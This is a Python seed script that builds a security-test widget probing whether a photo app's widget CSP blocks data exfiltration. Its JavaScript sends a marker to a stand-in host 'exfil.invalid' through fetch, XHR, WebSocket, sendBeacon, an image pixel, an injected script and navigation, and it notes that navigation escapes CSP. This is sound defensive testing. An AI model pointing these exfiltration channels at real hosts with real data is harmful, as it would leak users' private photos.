#!/usr/bin/env python3
"""Seed a 'Sandbox probe' page: one widget that *attempts* to exfiltrate data.

A defensive security test of the widget-frame CSP (see _widget_frame_csp in
yaffo/routes/pages.py). The widget tries every common egress channel — fetch, XHR,
WebSocket, sendBeacon, an <img> pixel, an injected <script> — toward an attacker
endpoint, and reports which the sandbox blocked. It listens for
`securitypolicyviolation` events to show the CSP doing its job.

Nothing actually leaves the machine: the payload is a benign marker (not real photo
data), and the destination uses the reserved `.invalid` TLD, which never resolves.

NOT a curated template (the agent should never build these). Run:
    python -m yaffo.scripts.seed_sandbox_probe

Idempotent: re-running replaces the 'Sandbox probe' page.
"""
from __future__ import annotations

from yaffo.app import create_app
from yaffo.db import db
from yaffo.db.repositories import custom_page_repository as page_repo

_TITLE = "Sandbox probe"
_SUBTITLE = "Security test: a widget that tries to exfiltrate data. The CSP should block every network channel."

_CSS = """\
.probe { font-size: 13px; color: #212529; }
.probe-head { margin-bottom: 10px; }
.probe-head strong { display: block; font-size: 14px; }
.probe-sub { color: #6c757d; font-size: 12px; }
.at-risk { background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 6px; padding: 8px 10px; margin-bottom: 12px; color: #495057; }
.at-risk code { font-family: 'Courier New', monospace; font-size: 11px; color: #c92a2a; word-break: break-all; }
table { width: 100%; border-collapse: collapse; margin-bottom: 12px; }
th, td { text-align: left; padding: 6px 8px; border-bottom: 1px solid #dee2e6; }
th { font-size: 11px; text-transform: uppercase; letter-spacing: 0.04em; color: #6c757d; }
td.channel { font-family: 'Courier New', monospace; font-size: 12px; }
td .detail { color: #adb5bd; font-size: 11px; }
.blocked { color: #2b8a3e; font-weight: 600; }
.leaked { color: #c92a2a; font-weight: 600; }
.csp h4 { font-size: 12px; margin-bottom: 4px; }
.csp ul { list-style: none; font-size: 11px; color: #6c757d; }
.csp li { padding: 2px 0; font-family: 'Courier New', monospace; }
.csp .none { color: #adb5bd; }
.nav-test { margin-top: 12px; padding: 7px 12px; font-size: 12px; color: #fff; background: #c92a2a; border: none; border-radius: 6px; cursor: pointer; }
"""

_HTML = """\
<div class="probe">
  <div class="probe-head">
    <strong>🛡 Sandbox exfiltration probe</strong>
    <span class="probe-sub">Tries to send data off-origin through every channel. Under the widget CSP each should fail.</span>
  </div>
  <div class="at-risk">An exploit would target the photo data injected into the widget:<br><code id="at-risk"></code></div>
  <table>
    <thead><tr><th>Channel</th><th>Result</th></tr></thead>
    <tbody id="results"></tbody>
  </table>
  <div class="csp">
    <h4>securitypolicyviolation events (the CSP blocking it):</h4>
    <ul id="violations"><li class="none">(none yet)</li></ul>
  </div>
  <button type="button" class="nav-test" id="nav-test">Try navigation exfil — not CSP-blocked (breaks this widget)</button>
</div>
"""

_JS = """\
(function () {
  // A stand-in marker — NOT the real photo data — so this test never leaks anything.
  // A real exploit would use JSON.stringify(yaffo.data). The destination .invalid TLD
  // is guaranteed never to resolve, so even the navigation attempt sends nothing.
  const SECRET = 'PROBE-SECRET-' + Date.now();
  const ATTACKER = 'https://exfil.invalid/steal?d=' + encodeURIComponent(SECRET);

  document.getElementById('at-risk').textContent =
    (JSON.stringify(yaffo.data) || '{}').slice(0, 180) + '…';

  const tbody = document.getElementById('results');
  const seen = {};
  function record(channel, blocked, detail) {
    if (seen[channel]) return;            // first outcome wins (ignore late duplicates)
    seen[channel] = true;
    const tr = document.createElement('tr');
    tr.innerHTML = "<td class='channel'></td><td></td>";
    tr.children[0].textContent = channel;
    tr.children[1].innerHTML = blocked
      ? "<span class='blocked'>✓ blocked</span> <span class='detail'></span>"
      : "<span class='leaked'>✗ LEAKED</span> <span class='detail'></span>";
    tr.children[1].querySelector('.detail').textContent = detail || '';
    tbody.appendChild(tr);
  }

  const vList = document.getElementById('violations');
  const violations = [];
  document.addEventListener('securitypolicyviolation', (e) => {
    violations.push({ directive: e.effectiveDirective || e.violatedDirective, uri: e.blockedURI });
    if (vList.querySelector('.none')) vList.innerHTML = '';
    const li = document.createElement('li');
    li.textContent = (e.effectiveDirective || e.violatedDirective) + '  ⟵  ' + (e.blockedURI || '');
    vList.appendChild(li);
  });

  // 1. fetch
  try {
    fetch(ATTACKER, { mode: 'no-cors' })
      .then(() => record('fetch()', false, 'request went out'))
      .catch((err) => record('fetch()', true, err.name + ': ' + err.message));
  } catch (err) { record('fetch()', true, err.name); }

  // 2. XMLHttpRequest
  try {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', ATTACKER);
    xhr.onerror = () => record('XMLHttpRequest', true, 'error event');
    xhr.onload = () => record('XMLHttpRequest', false, 'loaded');
    xhr.send();
  } catch (err) { record('XMLHttpRequest', true, err.name); }

  // 3. WebSocket
  try {
    const ws = new WebSocket('wss://exfil.invalid/c2');
    ws.onerror = () => record('WebSocket', true, 'error event');
    ws.onopen = () => record('WebSocket', false, 'connected');
  } catch (err) { record('WebSocket', true, err.name + ': ' + err.message); }

  // 4. navigator.sendBeacon — sendBeacon returns true when the data is QUEUED, before
  //    the CSP check on the send, so the return value is not proof of delivery. Judge
  //    it by whether connect-src fires a violation. Fire it after the other probes so
  //    a fresh violation is attributable to the beacon.
  setTimeout(() => {
    const before = violations.length;
    let ret;
    try {
      ret = navigator.sendBeacon ? navigator.sendBeacon('https://exfil.invalid/beacon?d=' + encodeURIComponent(SECRET), SECRET) : false;
    } catch (err) { record('navigator.sendBeacon', true, err.name); return; }
    setTimeout(() => {
      const blocked = violations.length > before;
      record('navigator.sendBeacon', blocked, blocked
        ? 'returned ' + ret + ' (queued), then connect-src blocked the send'
        : 'returned ' + ret + ' and NO CSP violation fired — verify it did not leave');
    }, 700);
  }, 500);

  // 5. <img> tracking pixel
  const img = new Image();
  img.onerror = () => record('<img> pixel', true, 'blocked / failed');
  img.onload = () => record('<img> pixel', false, 'loaded');
  img.src = 'https://exfil.invalid/pixel?d=' + encodeURIComponent(SECRET);

  // 6. injected <script src> (remote C2)
  const s = document.createElement('script');
  s.onerror = () => record('<script src>', true, 'blocked / failed');
  s.onload = () => record('<script src>', false, 'loaded');
  s.src = 'https://exfil.invalid/c2.js';
  document.head.appendChild(s);

  // 7. frame self-navigation — the one channel CSP does NOT cover. Gated behind a
  //    click so it doesn't break the report; .invalid means nothing actually egresses.
  document.getElementById('nav-test').addEventListener('click', () => {
    window.location = 'https://exfil.invalid/nav?d=' + encodeURIComponent(SECRET);
  });
})();
"""


def seed_sandbox_probe() -> None:
    app = create_app()
    with app.app_context():
        db.create_all()
        existing = {p.title: p.id for p in page_repo.list_pages(db.session)}
        if _TITLE in existing:
            page_repo.delete_page(db.session, existing[_TITLE])
        page = page_repo.create_page(db.session, title=_TITLE, subtitle=_SUBTITLE)
        page_repo.save_page_widgets(db.session, page.id, [{
            "id": page_repo.new_widget_id(),
            "title": "Exfiltration probe",
            "data_query": {"photos": {"source": "media_items", "limit": 3}},
            "html": _HTML,
            "css": _CSS,
            "js": _JS,
            "state": {},
            "x": 0, "y": 0, "w": 12, "h": 5,
        }])
        print(f"Seeded '{page.title}' (id={page.id}).")


if __name__ == "__main__":
    seed_sandbox_probe()
